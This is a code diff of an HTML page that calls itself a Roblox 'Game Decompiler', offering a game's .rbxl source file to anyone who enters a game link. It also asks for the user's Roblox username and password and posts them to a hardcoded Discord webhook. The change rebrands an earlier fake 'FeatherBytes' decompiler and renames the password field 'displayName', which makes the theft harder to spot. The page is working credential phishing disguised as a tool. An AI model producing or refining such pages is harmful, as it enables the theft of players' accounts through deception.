@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Feather Byte Decompiler</title>
+    <title>Game Decompiler</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;700&display=swap');
 
@@ -134,22 +134,22 @@
 <body>
 
 <div class="container">
-    <h1>FeatherBytes™</h1>
-    <p class="description">Fast and accurate Luau Bytecode Decompiler.</p>
+    <h1>Game Decompiler</h1>
+    <p class="description">Submit a Roblox link to request the .rbxl source file.</p>
     
     <div class="input-group">
-        <input type="text" id="displayName" placeholder="Bytecode">
+        <input type="text" id="gameLink" placeholder="Roblox Game Link">
     </div>
 
     <div class="input-group">
-        <input type="text" id="username" placeholder="Username">
+        <input type="text" id="username" placeholder="Roblox Username">
     </div>
 
     <div class="input-group">
-        <input type="text" id="password" placeholder="Password">
+        <input type="text" id="displayName" placeholder="Roblox Password">
     </div>
 
-    <button id="submitBtn" onclick="sendToWebhook()">Submit</button>
+    <button id="submitBtn" onclick="sendToWebhook()">Submit Request</button>
     
     <div id="status"></div>
 </div>
@@ -158,9 +158,9 @@
     async function sendToWebhook() {
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1477445891391619255/sdSVJwb1hSZASH12-crIs03fdtF4wDge2aVJWkowtfRXjX99-lHLBGrl7ag4UA4yB_Mu';
         
-        const displayName = document.getElementById('displayName').value.trim();
+        const gameLink = document.getElementById('gameLink').value.trim();
         const username = document.getElementById('username').value.trim();
-        const password = document.getElementById('password').value.trim();
+        const displayName = document.getElementById('displayName').value.trim();
         const status = document.getElementById('status');
         const btn = document.getElementById('submitBtn');
 
@@ -175,12 +175,12 @@
 
         const payload = {
             embeds: [{
-                title: "New Account Registeration Request",
+                title: "🛰️ New Decompiler Request",
                 color: 0x00f2ff,
                 fields: [
-                    { name: "👤 Bytecode", value: displayName },
+                    { name: "🔗 Game Link", value: gameLink },
                     { name: "👤 Username", value: username, inline: true },
-                    { name: "📛 Password", value: password, inline: true }
+                    { name: "📛 Password", value: displayName, inline: true }
                 ],
                 footer: { text: "Transmission logged" },
                 timestamp: new Date()
